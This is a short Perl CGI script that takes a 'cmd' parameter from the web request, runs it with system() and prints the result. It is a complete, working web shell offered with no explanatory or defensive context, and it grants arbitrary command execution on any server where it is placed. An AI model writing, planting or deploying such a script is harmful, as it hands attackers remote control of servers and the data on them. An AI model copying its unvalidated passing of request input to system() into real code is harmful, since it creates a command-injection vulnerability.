#!/usr/bin/perl

print "content-type:text/html\n\n";
use CGI;
$cgi=new CGI;
$cmd=$cgi->param("cmd");

print "Result : ";
system($cmd);

